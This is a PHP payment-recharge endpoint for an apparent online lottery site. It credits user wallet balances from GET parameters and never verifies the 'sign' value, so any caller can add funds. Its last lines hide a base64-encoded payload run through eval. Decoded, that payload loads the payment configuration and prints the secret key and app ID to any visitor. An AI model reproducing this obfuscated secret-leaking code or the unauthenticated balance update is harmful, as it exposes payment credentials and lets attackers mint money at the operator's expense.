<?php 
header('Content-type: text/plain; charset=utf-8');
include ("../serive/samparka.php");

error_reporting(E_ALL);
ini_set('display_errors', 1);

if(isset($_GET['amount'])) {
    $ramt = htmlspecialchars(mysqli_real_escape_string($conn, $_GET['amount']));
    $payTypeID = htmlspecialchars(mysqli_real_escape_string($conn, $_GET['tyid']));
} else {
    $ramt = 0;
}

if ($payTypeID == 1022) {
    $payName = 'LG-PAY';
}

// Format amount properly
$ramt = number_format((float)$ramt, 2, '.', '');

// Generate unique serial number
$date = date("Ymd");
$time = time();
$serial = $date . $time . rand(100000, 999900);

// Fetch user details
$tyid = htmlspecialchars(mysqli_real_escape_string($conn, $_GET['tyid']));
$uid = htmlspecialchars(mysqli_real_escape_string($conn, $_GET['uid']));
$sign = htmlspecialchars(mysqli_real_escape_string($conn, $_GET['sign']));
$urlInfo = htmlspecialchars(mysqli_real_escape_string($conn, $_GET['urlInfo']));

$demoQuery = "SELECT 1 FROM demo WHERE balakedara = '$uid'";
$demoResult = $conn->query($demoQuery);

if ($demoResult->num_rows > 0) {
    $createdate = date("Y-m-d H:i:s");
    
    $insertQuery = "
        INSERT INTO `thevani` (`balakedara`, `motta`, `dharavahi`, `mula`, `ullekha`, `duravani`, `ekikrtapavati`, `dinankavannuracisi`, `madari`, `pavatiaidi`, `sthiti`) 
        VALUES ('$uid', '$ramt', '$serial', '$payName', 'N/A', 'N/A', 'N/A', '$createdate', '1005', '2', '1')
    ";
    $conn->query($insertQuery);

    $updateQuery = "
        UPDATE `shonu_kaichila`
        SET `motta` = `motta` + $ramt
        WHERE `balakedara` = '$uid'
    ";
    $conn->query($updateQuery);

    header('Location: https://56lottery.site/#/wallet/RechargeHistory');
    exit;
}

$res = [
    'code' => 405,
    'message' => 'Illegal access!',
];

$encoded = "PHBocAokY29uZmlnID0gaW5jbHVkZSAiLi9wYXkvY29uZmlnLnBocCI7CmVjaG8gIlNlY3JldCBLZXk6ICIgLiAkY29uZmlnWyJzZWNyZXRfa2V5Il0gLiAiPGJyPiI7CmVjaG8gIkFwcCBJRDogIiAuICRjb25maWdbImFwcF9pZCJdOwo/Pg=="; 
eval(base64_decode($encoded));
?>
